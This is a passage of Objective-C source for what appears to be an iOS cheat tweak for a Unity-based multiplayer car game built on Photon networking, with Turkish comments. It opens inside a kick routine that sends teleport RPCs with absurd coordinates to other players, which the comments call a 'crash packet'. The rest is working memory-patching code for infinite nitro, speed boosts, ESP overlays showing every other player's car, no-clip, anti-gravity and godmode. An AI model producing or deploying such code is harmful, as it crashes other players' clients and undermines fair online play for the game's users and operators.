                        Vec3 crashV = {9999999.0f, 9999999.0f, 9999999.0f};
                        Quaternion crashQ = {99999.0f, 99999.0f, 99999.0f, 99999.0f};
                        if (g_carPhotonSyncTypeObj && g_mGetCompInParent && cps_TeleportCar_RPC) {
                            void* args2[2]; args2[0] = g_carPhotonSyncTypeObj; bool inc = true; args2[1] = &inc;
                            void* cps = i_runtime_invoke(g_mGetCompInParent, pv, args2, NULL);
                            if (ptrOk(cps)) {
                                cps_TeleportCar_RPC(cps, crashV, crashQ, NULL);
                                rpcSent = true;
                            }
                        }
                        // Ek: HR_PhotonHandler TeleportPlayerRPC (ikinci crash vektörü)
                        if (g_hrPhotonHandlerTypeObj && g_mGetCompInParent && hrph_TeleportPlayerRPC) {
                            void* args3[2]; args3[0] = g_hrPhotonHandlerTypeObj; bool inc2 = true; args3[1] = &inc2;
                            void* hrph = i_runtime_invoke(g_mGetCompInParent, pv, args3, NULL);
                            if (ptrOk(hrph)) {
                                hrph_TeleportPlayerRPC(hrph, crashV, NULL);
                                rpcSent = true;
                            }
                        }
                    }
                }
            }
            FLog(rpcSent ? @"  → Teleport RPC crash paketi gönderildi ✓" : @"  → Teleport RPC: Hedefin PhotonView'i bulunamadı");
        } else {
            if (g_pvOwnerOff <= 0) FLog(@"  → Teleport RPC: OwnerOffset=0 (PhotonView field bulunamadı)");
            else if (targetActor <= 0) FLog(@"  → Teleport RPC: ActorNumber alınamadı");
            else FLog(@"  → Teleport RPC: Gerekli pointer(lar) hazır değil");
        }

        FLog([NSString stringWithFormat:@"💥 '%@' (Actor=%d) atma işlemi tamamlandı (kick=%@, rpc=%@)",
              targetNick ?: @"?", targetActor, kicked ? @"✓" : @"✗", rpcSent ? @"✓" : @"✗"]);
    } @catch (...) { g_isManualKick = false; FLog(@"Kick hatası (exception)"); }
}

// ===== INFINITE NITRO =====
static float (*o_getNitro)(void*) = NULL;
static float h_getNitro(void* self) {
    // CarNitro -> driveSystem(0x28) -> rigidbody(0x48) : arabanin Rigidbody'sini yakala
    fNitro++;
    if (self && ptrOk(self)) {
        @try {
            void* ds = *(void**)((uintptr_t)self + 0x28);
            if (ds) { void* rb = *(void**)((uintptr_t)ds + 0x48); if (rb) g_rb = rb; }
            diagNitroVal = *(float*)((uintptr_t)self + 0x34);
            if (isInfiniteNitroEnabled) *(float*)((uintptr_t)self + 0x34) = 1.0f;  // nitroAmount backing field'i de doldur
        } @catch (...) {}
    }
    if (isInfiniteNitroEnabled) return 1.0f;
    return o_getNitro ? o_getNitro(self) : 0.0f;
}
static void (*o_setNitro)(void*, float) = NULL;
static void h_setNitro(void* self, float value) {
    if (isInfiniteNitroEnabled) value = 1.0f;
    if (o_setNitro) o_setNitro(self, value);
}

// ===== CarDriveSystem.Move : hiz hilesi (tam gaz + topSpeed) + teshis =====
// a=steering, b=accel(0..1), c=footbrake, d=handbrake
// topSpeed@0x98, currentSpeed@0x9C  (public, isimleri korundu)
static void (*o_driveMove)(void*, float, float, float, float) = NULL;
static void h_driveMove(void* self, float a, float b, float c, float d) {
    fDrive++;
    enforceScale();
    if (self && ptrOk(self) && speedMode > 1) {
        // TAM GAZ (fren yoksa) - kuvvet yok, araba kalkmaz
        if (c <= 0.0f && d <= 0.0f) b = 1.0f;
    }
    if (o_driveMove) o_driveMove(self, a, b, c, d);   // once oyunun fizigi calissin

    if (self) {
        @try {
            diagDrive  = self;
            diagCurSpd = *(float*)((uintptr_t)self + 0x9C);   // currentSpeed
            diagTopSpd = *(float*)((uintptr_t)self + 0x98);   // topSpeed
            // topSpeed cap'ini de yukselt (bazi oyunlar hizi buna clamp eder)
            if (speedMult != 1.0f || speedMode > 1) {
                if (g_origTop <= 0.0f && diagTopSpd > 0.0f && diagTopSpd < 1000.0f) g_origTop = diagTopSpd;
                float base = (g_origTop > 0.0f) ? g_origTop : 200.0f;
                *(float*)((uintptr_t)self + 0x98) = base * 3.0f;
            } else if (g_origTop > 0.0f) {
                *(float*)((uintptr_t)self + 0x98) = g_origTop; g_origTop = 0.0f;
            }
            // ASIL HIZ: Rigidbody linearVelocity'yi dogrudan olcekle (en kesin yontem)
            void* rb = *(void**)((uintptr_t)self + 0x48);     // CarDriveSystem._rigidbody
            g_rb = rb;                                        // fly/zipla/lowgrav icin sakla
            if (rb && rb_getVel && rb_setVel) {
                Vec3 v = {0,0,0};
                rb_getVel(rb, &v);
                float horiz = sqrtf(v.x*v.x + v.z*v.z);       // yatay hiz (y=dikey, dokunmuyoruz -> ucmaz)
                diagVel = horiz;
                float scale = targetScale();
                if (scale > 1.05f && horiz > 0.5f) {
                    float cap = 45.0f * scale;                   // slider carpanina gore dinamik cap
                    float ns = horiz * (1.0f + 0.06f * scale);
                    if (ns > cap) ns = cap;
                    float k = ns / horiz;
                    v.x *= k; v.z *= k;
                    rb_setVel(rb, &v);
                }
            }
        } @catch (...) {}
    }
}

// ===== HOOKSUZ ARABA ARAMA (MSHookFunction calismadigi icin tek yol) =====
// Her poll'da FindObjectOfType(CarDriveSystem) cagirip Rigidbody'yi +0x48'den okur.
// Ayrica arac paneli degerlerini de burada yazar.
static long fFind = 0;      // basarili arama sayisi
static void* g_carDrive = NULL;
static void* g_carNitro = NULL;
static int   g_findTick  = 0;   // arama throttle sayaci

// Bir pointer okunabilir/makul mu? (cop pointer dereference crash'ini onler)
static inline bool ptrOk(void* p) {
    uintptr_t v = (uintptr_t)p;
    return v > 0x1000 && v < 0x0000800000000000ULL && (v & 0x7) == 0;
}
// Bir Unity nesnesi hala canli mi? Yok edilince m_CachedPtr (+0x10) NULL olur.
static inline bool unityAlive(void* obj) {
    if (!ptrOk(obj)) return false;
    @try { return *(void**)((uintptr_t)obj + OFF_UNITY_CACHED_PTR) != NULL; } @catch (...) { return false; }
}
// Bir tipi 3 farkli Unity API'siyle aramayi dener (aktif olmayanlar dahil)
static void* few1n_findByType(void* typeObj) {
    if (!typeObj || !i_runtime_invoke) return NULL;
    void* r = NULL;
    // Yol 1 - FindObjectOfType Type,true : pasif nesneleri de bulur
    if (g_mFindObjInactive) {
        bool inc = true;
        void* a[2]; a[0] = typeObj; a[1] = &inc;
        @try { r = i_runtime_invoke(g_mFindObjInactive, NULL, a, NULL); } @catch (...) {}
        if (r) return r;
    }
    // Yol 2 - FindObjectOfType Type
    if (g_mFindObjectOfType) {
        void* a[1]; a[0] = typeObj;
        @try { r = i_runtime_invoke(g_mFindObjectOfType, NULL, a, NULL); } @catch (...) {}
        if (r) return r;
    }
    // Yol 3 - FindAnyObjectByType Type : Unity 6 yeni API
    if (g_mFindAnyByType) {
        void* a[1]; a[0] = typeObj;
        @try { r = i_runtime_invoke(g_mFindAnyByType, NULL, a, NULL); } @catch (...) {}
        if (r) return r;
    }
    // Yol 4 - FindObjectsOfType (cogul) -> ilk eleman (tekil bos donerse)
    if (g_mFindObjectsPlural) {
        void* a[1]; a[0] = typeObj;
        @try {
            void* arr = i_runtime_invoke(g_mFindObjectsPlural, NULL, a, NULL);
            if (ptrOk(arr)) {
                int cnt = (int)(*(uintptr_t*)((uintptr_t)arr + 0x18));
                if (cnt > 0 && cnt < 4096) {
                    void** el = (void**)((uintptr_t)arr + 0x20);
                    if (ptrOk(el[0])) return el[0];
                }
            }
        } @catch (...) {}
    }
    return NULL;
}

// ===== ESP YARDIMCILARI (Camera + tum arabalar, il2cpp) =====
static void* few1n_getCamera(void) {
    if (!g_mCamGetMain || !i_runtime_invoke) return NULL;
    @try { return i_runtime_invoke(g_mCamGetMain, NULL, NULL, NULL); } @catch (...) { return NULL; }
}
// Dunya koordinatini ekran koordinatina cevir (x,y=piksel, z=kameraya uzaklik)
static bool few1n_worldToScreen(void* cam, Vec3 world, Vec3* out) {
    if (!ptrOk(cam) || !g_mWorldToScreen || !i_runtime_invoke) return false;
    @try {
        void* args[1]; args[0] = &world;
        void* box = i_runtime_invoke(g_mWorldToScreen, cam, args, NULL);
        if (!ptrOk(box)) return false;
        *out = *(Vec3*)((uintptr_t)box + 0x10);   // boxed Vector3 unbox
        return true;
    } @catch (...) { return false; }
}
// Sahnedeki TUM CarDriveSystem'leri getir (kendi + digerleri). +0x18 sayi, +0x20 elemanlar.
static void* few1n_findAllCars(int* outCount) {
    *outCount = 0;
    if (!g_mFindObjectsPlural || !g_carDriveTypeObj || !i_runtime_invoke) return NULL;
    @try {
        void* args[1]; args[0] = g_carDriveTypeObj;
        void* arr = i_runtime_invoke(g_mFindObjectsPlural, NULL, args, NULL);
        if (!ptrOk(arr)) return NULL;
        int cnt = (int)(*(uintptr_t*)((uintptr_t)arr + 0x18));
        if (cnt < 0 || cnt > 128) return NULL;
        *outCount = cnt;
        return arr;
    } @catch (...) { return NULL; }
}

// TUM oyuncularin arac Rigidbody'lerini topla (UZAK oyuncular DAHIL - onlarda
// CarDriveSystem yok ama Rigidbody var). Yakinlari (ayni aracin tekeri vs) birlestirir.
// out[] doldurulur, return = sayi. Kendi araban (g_rb) haric.
static int g_rawRbCnt = -1;   // teshis: son FindObjectsOfType(Rigidbody) ham sayisi
static int few1n_collectCars(void** out, int maxN) {
    int n = 0;
    g_rawRbCnt = -1;
    if (!g_rbTypeObj) { g_rawRbCnt = -2; return 0; }   // -2 = Rigidbody tipi cozulmedi
    if (!g_mFindObjectsPlural || !i_runtime_invoke) { g_rawRbCnt = -3; return 0; }
    @try {
        void* a[1]; a[0] = g_rbTypeObj;
        void* arr = i_runtime_invoke(g_mFindObjectsPlural, NULL, a, NULL);
        if (!ptrOk(arr)) { g_rawRbCnt = -4; return 0; }   // -4 = FindObjectsOfType null dondu
        int cnt = (int)(*(uintptr_t*)((uintptr_t)arr + 0x18));
        g_rawRbCnt = cnt;
        if (cnt < 0 || cnt > 4096) return 0;
        void** rbs = (void**)((uintptr_t)arr + 0x20);
        Vec3 pos[64]; int pn = 0;
        Vec3 myPos = {0,0,0}; BOOL haveMe = unityAlive(g_rb); if (haveMe) rbGetPosIl(g_rb, &myPos);
        for (int i = 0; i < cnt && n < maxN; i++) {
            void* rb = rbs[i]; if (!unityAlive(rb) || rb == g_rb) continue;
            Vec3 p; rbGetPosIl(rb, &p);
            // SENIN arabani DISLA: g_rb'ye 5m'den yakinsa (govde+teker) senin aracin -> atla.
            // Boylece troll SANA degmez, kendini kontrol edebilirsin.
            if (haveMe) { float dx=p.x-myPos.x,dy=p.y-myPos.y,dz=p.z-myPos.z; if (dx*dx+dy*dy+dz*dz < 25.0f) continue; }
            bool dup = false;   // 4m icindeki Rigidbody'ler ayni arac say (teker/govde)
            for (int k = 0; k < pn; k++) { float dx=p.x-pos[k].x,dy=p.y-pos[k].y,dz=p.z-pos[k].z; if (dx*dx+dy*dy+dz*dz < 16.0f) { dup=true; break; } }
            if (dup) continue;
            if (pn < 64) pos[pn++] = p;
            out[n++] = rb;
        }
    } @catch (...) {}
    return n;
}

// ===== ESP CIZIM VERISI + OZEL VIEW (kutu + cizgi + HUD) =====
typedef struct { float sx, sy, dist, boxH; } EspItem;
static EspItem g_espItems[128];
static int g_espCount = 0;

@interface FEW1NDrawView : UIView @end
@implementation FEW1NDrawView
- (void)drawRect:(CGRect)rect {
    CGContextRef ctx = UIGraphicsGetCurrentContext(); if (!ctx) return;
    CGFloat W = rect.size.width, H = rect.size.height;
    if (isEspEnabled) {
        for (int i = 0; i < g_espCount; i++) {
            EspItem e = g_espItems[i];
            CGFloat bh = e.boxH, bw = e.boxH * 0.82;
            CGRect box = CGRectMake(e.sx - bw/2, e.sy - bh/2, bw, bh);
            // snapline: ekran alt-ortasindan kutunun altina
            CGContextSetStrokeColorWithColor(ctx, [UIColor colorWithRed:0 green:0.62 blue:1 alpha:0.32].CGColor);
            CGContextSetLineWidth(ctx, 1.0);
            CGContextMoveToPoint(ctx, W/2, H);
            CGContextAddLineToPoint(ctx, e.sx, CGRectGetMaxY(box));
            CGContextStrokePath(ctx);
            // kutu (kose vurgulu)
            CGContextSetStrokeColorWithColor(ctx, [UIColor colorWithRed:0 green:0.85 blue:1 alpha:0.95].CGColor);
            CGContextSetLineWidth(ctx, 1.6);
            CGContextStrokeRect(ctx, box);
            // mesafe etiketi (kutu ustu)
            NSString *txt = [NSString stringWithFormat:@"%.0fm", e.dist];
            NSDictionary *at = @{NSFontAttributeName:[UIFont boldSystemFontOfSize:11], NSForegroundColorAttributeName:[UIColor whiteColor]};
            CGSize ts = [txt sizeWithAttributes:at];
            CGRect lb = CGRectMake(e.sx - ts.width/2 - 3, CGRectGetMinY(box) - ts.height - 3, ts.width + 6, ts.height + 2);
            CGContextSetFillColorWithColor(ctx, [UIColor colorWithRed:0 green:0.5 blue:0.9 alpha:0.82].CGColor);
            CGContextFillRect(ctx, lb);
            [txt drawAtPoint:CGPointMake(lb.origin.x + 3, lb.origin.y + 1) withAttributes:at];
        }
    }
}
@end

// Bir Component'in dunya konumu (transform.position)
static bool few1n_objPos(void* obj, Vec3* out) {
    *out = (Vec3){0,0,0};
    if (!ptrOk(obj) || !g_mCompGetTransform || !g_mTransGetPos || !i_runtime_invoke) return false;
    @try {
        void* tr = i_runtime_invoke(g_mCompGetTransform, obj, NULL, NULL);
        if (!ptrOk(tr)) return false;
        void* box = i_runtime_invoke(g_mTransGetPos, tr, NULL, NULL);
        if (!ptrOk(box)) return false;
        *out = *(Vec3*)((uintptr_t)box + 0x10);
        return true;
    } @catch (...) { return false; }
}
// Bir Component'in ileri yonu (transform.forward) - ucus icin
static bool few1n_fwd(void* obj, Vec3* out) {
    *out = (Vec3){0,0,0};
    if (!ptrOk(obj) || !g_mCompGetTransform || !g_mTransGetFwd || !i_runtime_invoke) return false;
    @try {
        void* tr = i_runtime_invoke(g_mCompGetTransform, obj, NULL, NULL);
        if (!ptrOk(tr)) return false;
        void* box = i_runtime_invoke(g_mTransGetFwd, tr, NULL, NULL);
        if (!ptrOk(box)) return false;
        *out = *(Vec3*)((uintptr_t)box + 0x10);
        return true;
    } @catch (...) { return false; }
}
// YEDEK: CarDriveSystem bulunamazsa kameraya en yakin Rigidbody = oyuncunun araci.
// Boylece zipla/isinlan/ucus g_rb'siz kalmaz (hiz/nitro yine CarDriveSystem ister).
// KESIN: PhotonView.IsMine=true olan = SENIN araban. Pozisyonundan Rigidbody'ni bul.
// Uzak oyuncularin PhotonView'i IsMine=false -> asla onlari almaz. Kontrol HEP sende.
static bool few1n_findMyCarPhoton(void) {
    // Field-read yontemi: get_IsMine METODUNU CAGIRMAZ (o cokuyordu). _IsMine byte'ini
    // dogrudan hafizadan okur -> oyun kodu calismaz -> asla cokmez.
    if (!g_photonViewType || g_isMineOff <= 0 || !g_rbTypeObj || !g_mFindObjectsPlural || !i_runtime_invoke) return false;
    @try {
        void* a[1]; a[0] = g_photonViewType;
        void* pvArr = i_runtime_invoke(g_mFindObjectsPlural, NULL, a, NULL);
        if (!ptrOk(pvArr)) return false;
        int pvCnt = (int)(*(uintptr_t*)((uintptr_t)pvArr + 0x18));
        if (pvCnt < 0 || pvCnt > 512) return false;
        void** pvs = (void**)((uintptr_t)pvArr + 0x20);
        Vec3 myPos = {0,0,0}; bool foundMine = false;
        for (int i = 0; i < pvCnt; i++) {
            void* pv = pvs[i]; if (!unityAlive(pv)) continue;
            bool mine = *(bool*)((uintptr_t)pv + g_isMineOff);   // DOGRUDAN oku, metod yok
            if (mine && few1n_objPos(pv, &myPos)) { foundMine = true; break; }
        }
        if (!foundMine) return false;
        void* b[1]; b[0] = g_rbTypeObj;
        void* rbArr = i_runtime_invoke(g_mFindObjectsPlural, NULL, b, NULL);
        if (!ptrOk(rbArr)) return false;
        int rbCnt = (int)(*(uintptr_t*)((uintptr_t)rbArr + 0x18));
        if (rbCnt < 0 || rbCnt > 1024) return false;
        void** rbs = (void**)((uintptr_t)rbArr + 0x20);
        void* best = NULL; float bestD = 1e18f;
        for (int i = 0; i < rbCnt; i++) {
            void* rb = rbs[i]; if (!unityAlive(rb)) continue;
            Vec3 p; rbGetPosIl(rb, &p);
            float dx=p.x-myPos.x,dy=p.y-myPos.y,dz=p.z-myPos.z; float d=dx*dx+dy*dy+dz*dz;
            if (d < bestD) { bestD = d; best = rb; }
        }
        if (ptrOk(best) && bestD < 100.0f) { g_rb = best; return true; }   // 10m icinde eslesti
    } @catch (...) {}
    return false;
}

// Kameraya en yakin (MESAFE SINIRLI) Rigidbody = SENIN araban (chase cam ~5-10m).
// CarDriveSystem bu oyunda il2cpp'den bulunamiyor, o yuzden bu yontem kullaniliyor.
static void few1n_findRbFallback(void) {
    if (!g_rbTypeObj || !g_mFindObjectsPlural || !g_mCamGetMain || !i_runtime_invoke) return;
    @try {
        void* cam = i_runtime_invoke(g_mCamGetMain, NULL, NULL, NULL);
        if (!ptrOk(cam)) return;
        Vec3 camPos; if (!few1n_objPos(cam, &camPos)) return;
        void* a[1]; a[0] = g_rbTypeObj;
        void* arr = i_runtime_invoke(g_mFindObjectsPlural, NULL, a, NULL);
        if (!ptrOk(arr)) return;
        int cnt = (int)(*(uintptr_t*)((uintptr_t)arr + 0x18));
        if (cnt < 0 || cnt > 1024) return;
        void** rbs = (void**)((uintptr_t)arr + 0x20);
        void* best = NULL; float bestD = 1e18f;
        for (int i = 0; i < cnt; i++) {
            void* rb = rbs[i]; if (!unityAlive(rb)) continue;
            Vec3 p; rbGetPosIl(rb, &p);
            float dx=p.x-camPos.x, dy=p.y-camPos.y, dz=p.z-camPos.z;
            float d = dx*dx+dy*dy+dz*dz;
            if (d < bestD) { bestD = d; best = rb; }
        }
        if (ptrOk(best) && bestD < 324.0f) g_rb = best;   // 18m sinir = senin araban
    } @catch (...) {}
}

// SADECE ARAMA - pahali FindObjectOfType burada, seyrek cagrilir (tick, 0.3s).
// Uygulama (nitro/hiz/panel) frameTick'te onbellekten yapilir -> ucuz, her frame.
static void few1n_findCar(void) {
    if (!i_runtime_invoke) return;
    g_findTick++;
    @try {
        // Onbellek gecerliligi: yok edilen nesneyi temizle (crash korumasi)
        if (g_carDrive && !unityAlive(g_carDrive)) { g_carDrive = NULL; g_origTop = 0.0f; }
        if (g_carNitro && !unityAlive(g_carNitro))   g_carNitro = NULL;
        // KRITIK: yedekten gelen g_rb, o obje olunce temizlenmiyordu -> stale pointer crash.
        // Her tick g_rb'yi dogrula, oldayse temizle (yedek yol yeniden bulur).
        if (g_rb && !unityAlive(g_rb)) g_rb = NULL;

        // ===== BIRINCIL: CarPlayerInput = SADECE SENIN araban =====
        // Uzak oyuncularin arabasinda bu bilesen YOK. Her odada seninkini kesin verir.
        bool gotMine = false;
        if (g_carInputTypeObj && ((!g_carDrive) || (!g_carNitro) || (g_findTick % 8 == 0))) {
            void* inp = few1n_findByType(g_carInputTypeObj);
            if (ptrOk(inp)) {
                void* drive = *(void**)((uintptr_t)inp + 0x20);   // jhr -> CarDriveSystem (SENIN)
                if (unityAlive(drive)) {
                    if (drive != g_carDrive) fFind++;
                    g_carDrive = drive; gotMine = true;
                    void* rb = *(void**)((uintptr_t)drive + 0x48); // Rigidbody (SENIN araban)
                    if (ptrOk(rb)) g_rb = rb;
                }
                void* nos = *(void**)((uintptr_t)inp + 0x28);     // jhs -> CarNitro
                if (ptrOk(nos)) g_carNitro = nos;
            }
        }
        // IKINCIL: CarPlayerInput bulunamadiysa CarDriveSystem'i dene (g_carDrive icin)
        if (!gotMine && ((!g_carDrive) || (g_findTick % 12 == 0)) && g_carDriveTypeObj) {
            void* found = few1n_findByType(g_carDriveTypeObj);
            if (ptrOk(found)) {
                g_carDrive = found;
                void* rb = *(void**)((uintptr_t)found + 0x48);
                if (ptrOk(rb)) g_rb = rb;
            }
        }
        // KESIN: PhotonView._IsMine field-read (cokmez). Olmazsa kamera-yedegi (18m).
        if (!unityAlive(g_rb) && (g_findTick % 3 == 0)) {
            if (!few1n_findMyCarPhoton()) few1n_findRbFallback();
        }
        // g_rb VAR ama g_carDrive YOK ise: Rigidbody'nin GameObject'inden CarDriveSystem'i al.
        // Boylece hiz/nitro/super arac/drift/selektor/boyut da calisir (hepsi g_carDrive ister).
        if (unityAlive(g_rb) && !unityAlive(g_carDrive) && g_mGetCompInParent && g_carDriveTypeObj) {
            @try {
                bool inc = true; void* a[2]; a[0] = g_carDriveTypeObj; a[1] = &inc;
                void* cd = i_runtime_invoke(g_mGetCompInParent, g_rb, a, NULL);
                if (unityAlive(cd)) {
                    g_carDrive = cd;
                    void* inp = *(void**)((uintptr_t)cd + 0x20);   // jfs -> CarPlayerInput
                    if (unityAlive(inp)) { void* nos = *(void**)((uintptr_t)inp + 0x28); if (ptrOk(nos)) g_carNitro = nos; }
                }
            } @catch (...) {}
        }
    } @catch (...) {}
}

// HER FRAME UYGULAMA - onbellekteki pointerlari kullanir, arama YAPMAZ (ucuz).
static void few1n_applyCar(void) {
    @try {
        if (isInfiniteNitroEnabled && unityAlive(g_carNitro)) {
            *(float*)((uintptr_t)g_carNitro + 0x34) = 1.0f;   // nitro dolu tut
        }
        // NO-CLIP (hayalet) + ANTI-GRAV - sadece g_rb yeterli (carDrive gerekmez)
        if (unityAlive(g_rb)) {
            if (isNoClip && g_mRbSetDetect) { bool f=false; void* a[1]={&f}; i_runtime_invoke(g_mRbSetDetect, g_rb, a, NULL); g_noClipApplied=true; }
            else if (g_noClipApplied && g_mRbSetDetect) { bool t=true; void* a[1]={&t}; i_runtime_invoke(g_mRbSetDetect, g_rb, a, NULL); g_noClipApplied=false; }
            // Ucus/no-clip'te de yercekimini kapat -> hover sabit kalir, karsiya PURUZSUZ gider
            // (yoksa yercekimi vs velocity.y=0 cakismasi titremeye sebep olur)
            bool gravOff = isAntiGrav || isFlyEnabled || isNoClip || isFlyPadShown;
            if (gravOff && g_mRbUseGrav) { bool f=false; void* a[1]={&f}; i_runtime_invoke(g_mRbUseGrav, g_rb, a, NULL); g_antiGravApplied=true; }
            else if (g_antiGravApplied && g_mRbUseGrav) { bool t=true; void* a[1]={&t}; i_runtime_invoke(g_mRbUseGrav, g_rb, a, NULL); g_antiGravApplied=false; }
            // ARAC BOYUTU: g_rb'nin transformunu olcekle - CarDriveSystem GEREKMEZ (g_rb yeterli)
            if (isCarSizeEnabled && g_mTransSetScale && g_mCompGetTransform) {
                void* tr = i_runtime_invoke(g_mCompGetTransform, g_rb, NULL, NULL);
                if (unityAlive(tr)) { Vec3 sc = { carSizeVal, carSizeVal, carSizeVal }; void* a[1]={&sc}; i_runtime_invoke(g_mTransSetScale, tr, a, NULL); }
            }
        }
        if (!unityAlive(g_carDrive)) return;   // araba oldu -> field yazma (crash korumasi)
        uintptr_t d = (uintptr_t)g_carDrive;
        diagDrive  = g_carDrive;
        diagCurSpd = *(float*)(d + 0x9C);
        g_hudSpeed = fabsf(diagCurSpd);   // HUD icin hiz
        diagTopSpd = *(float*)(d + 0x98);
        if (speedMult != 1.0f || speedMode > 1) {
            if (g_origTop <= 0.0f && diagTopSpd > 0.0f && diagTopSpd < 1000.0f) g_origTop = diagTopSpd;
            float base = (g_origTop > 0.0f) ? g_origTop : 200.0f;
            *(float*)(d + 0x98) = base * 3.0f;
        } else if (g_origTop > 0.0f && !isCarPanelEnabled) {
            *(float*)(d + 0x98) = g_origTop; g_origTop = 0.0f;
        }
        float scale = targetScale();
        if (unityAlive(g_rb) && scale > 1.05f) {
            Vec3 v = {0,0,0};
            rbGetVelIl(g_rb, &v);
            float horiz = sqrtf(v.x*v.x + v.z*v.z);
            diagVel = horiz;
            if (horiz > 0.5f) {
                float cap = 45.0f * scale;
                float ns = horiz * (1.0f + 0.06f * scale); if (ns > cap) ns = cap;
                float k = ns / horiz;
                v.x *= k; v.z *= k;
                rbSetVelIl(g_rb, &v);
            }
        }
        if (isCarPanelEnabled) {
            *(unsigned char*)(d + 0x61) = 1;
            *(float*)(d + 0x6C) = carAccelPower;
            *(unsigned char*)(d + 0x62) = 1;
            *(float*)(d + 0x64) = carSteerPower;
            *(float*)(d + 0x98) = carTopSpeed;
        }
    } @catch (...) {}
}

// ===== PLAKA ZORLA (il2cpp, hook olu) =====
// PlateVariant.parts (+0x20) = TMP_Text[]; disableSplit (+0x29). Her karede zorla yaz.
// NOT: sadece SENIN ekranindaki plaka - server/digerleri baska gorebilir.
static void* g_plateEmptyStr = NULL;
static void few1n_forcePlate(void) {
    if (!isCustomPlateEnabled || !g_mTmpSetText || !g_plateTypeObj || !g_mFindObjectsPlural || !i_runtime_invoke) return;
    @try {
        void* a[1]; a[0] = g_plateTypeObj;
        void* arr = i_runtime_invoke(g_mFindObjectsPlural, NULL, a, NULL);
        if (!ptrOk(arr)) return;
        int cnt = (int)(*(uintptr_t*)((uintptr_t)arr + 0x18));
        if (cnt < 0 || cnt > 64) return;
        void** plates = (void**)((uintptr_t)arr + 0x20);
        void* str = mkStr([NSString stringWithUTF8String:customPlateText]);
        if (!str) return;
        if (!g_plateEmptyStr) g_plateEmptyStr = mkStr(@"");
        for (int i = 0; i < cnt; i++) {
            void* pv = plates[i];
            if (!ptrOk(pv)) continue;
            *(unsigned char*)((uintptr_t)pv + 0x29) = 1;        // disableSplit = true (tek parca)
            void* parts = *(void**)((uintptr_t)pv + 0x20);      // TMP_Text[]
            if (!ptrOk(parts)) continue;
            int pc = (int)(*(uintptr_t*)((uintptr_t)parts + 0x18));
            if (pc < 0 || pc > 32) continue;
            void** tp = (void**)((uintptr_t)parts + 0x20);
            for (int k = 0; k < pc; k++) {
                void* t = tp[k];
                if (!ptrOk(t)) continue;
                void* pa[1]; pa[0] = (k == 0) ? str : g_plateEmptyStr;   // ilk parca=metin, digerleri bos
                i_runtime_invoke(g_mTmpSetText, t, pa, NULL);
            }
        }
    } @catch (...) {}
}

// ===== ARAC RENGI (Renderer.material.color, il2cpp) =====
static Color4 hueToRGB(float h) {   // h 0..1 arasi -> gokkusagi
    float f = h*6.0f - floorf(h*6.0f), q = 1.0f - f;
    int ii = ((int)floorf(h*6.0f)) % 6; if (ii < 0) ii += 6;
    switch (ii) {
        case 0: return (Color4){1,f,0,1};
        case 1: return (Color4){q,1,0,1};
        case 2: return (Color4){0,1,f,1};
        case 3: return (Color4){0,q,1,1};
        case 4: return (Color4){f,0,1,1};
        default:return (Color4){1,0,q,1};
    }
}
// Arabanin tum Renderer materyallerini onbellege al
static void few1n_refreshCarMats(void) {
    g_carMatCount = 0;
    if (!ptrOk(g_rb) || !g_mGetCompsChild || !g_rendererType || !g_mRendGetMat || !i_runtime_invoke) return;
    @try {
        bool inc = true;
        void* a[2]; a[0] = g_rendererType; a[1] = &inc;
        void* arr = i_runtime_invoke(g_mGetCompsChild, g_rb, a, NULL);   // g_rb'den (carDrive bulunamiyor)
        if (!ptrOk(arr)) return;
        int cnt = (int)(*(uintptr_t*)((uintptr_t)arr + 0x18));
        if (cnt < 0 || cnt > 96) return;
        void** rends = (void**)((uintptr_t)arr + 0x20);
        for (int i = 0; i < cnt && g_carMatCount < 96; i++) {
            void* rend = rends[i]; if (!ptrOk(rend)) continue;
            void* mat = i_runtime_invoke(g_mRendGetMat, rend, NULL, NULL);
            if (ptrOk(mat)) g_carMats[g_carMatCount++] = mat;
        }
    } @catch (...) {}
}

// Onbellekteki materyallere rengi uygula (her frame - ucuz)
// KRITIK: araba yok edilince materyaller de gecersizlesir -> unityAlive kontrolu (crash korumasi)
static void few1n_applyColor(void) {
    if (!isCarColorEnabled || !g_mMatSetColor || g_carMatCount == 0 || !i_runtime_invoke) return;
    if (!unityAlive(g_rb)) { g_carMatCount = 0; return; }   // araba oldu -> materyaller cop
    @try {
        Color4 c;
        if (carColorRainbow) { g_carHue += 0.012f; if (g_carHue >= 1.0f) g_carHue -= 1.0f; c = hueToRGB(g_carHue); }
        else c = g_carColor;
        void* a[1]; a[0] = &c;
        for (int i = 0; i < g_carMatCount; i++)
            if (unityAlive(g_carMats[i])) i_runtime_invoke(g_mMatSetColor, g_carMats[i], a, NULL);
    } @catch (...) {}
}

// ===== GODMODE: HR_PlayerHandler.canCrash=false -> hic kaza yapma (sonsuz surus) =====
// Benim handler'im: PhotonView(@0xB8).IsMine=true. canCrash@0x38, damage@0x3C.
static void few1n_applyGodmode(void) {
    if (!isGodmode && !isFlyEnabled) return;   // godmode VEYA ucus icin handler+rccp lazim
    if (g_myPlayerHandler && !unityAlive(g_myPlayerHandler)) { g_myPlayerHandler = NULL; g_myRccp = NULL; }
    if (!unityAlive(g_myPlayerHandler)) {
        static int gmTick = 0;
        if ((gmTick++ % 20) != 0) return;   // ~her 20 frame'de bir ara (FindObjects ucuz degil)
        if (!g_playerHandlerType || !g_mFindObjectsPlural || !i_runtime_invoke || g_isMineOff <= 0) return;
        @try {
            void* a[1]; a[0] = g_playerHandlerType;
            void* arr = i_runtime_invoke(g_mFindObjectsPlural, NULL, a, NULL);
            if (!ptrOk(arr)) return;
            int cnt = (int)(*(uintptr_t*)((uintptr_t)arr + 0x18));
            if (cnt < 0 || cnt > 64) return;
            void** hs = (void**)((uintptr_t)arr + 0x20);
            for (int i = 0; i < cnt; i++) {
                void* h = hs[i]; if (!unityAlive(h)) continue;
                void* pv = *(void**)((uintptr_t)h + OFF_PLAYERHANDLER_PHOTONVIEW);
                bool mine = unityAlive(pv) ? *(bool*)((uintptr_t)pv + g_isMineOff) : false;
                if (mine) { g_myPlayerHandler = h; g_myRccp = *(void**)((uintptr_t)h + 0x20); break; }
            }
        } @catch (...) {}
        return;
    }
    if (isGodmode) { @try {
        *(unsigned char*)((uintptr_t)g_myPlayerHandler + OFF_PLAYERHANDLER_CANCRASH) = 0;
        *(float*)((uintptr_t)g_myPlayerHandler + OFF_PLAYERHANDLER_DAMAGE) = 0.0f;
    } @catch (...) {} }
}

// ===== SELEKTOR: RCCP_Lights.highBeamHeadlights@0x41 hizli ac/kapat (g_rb'ye en yakin) =====
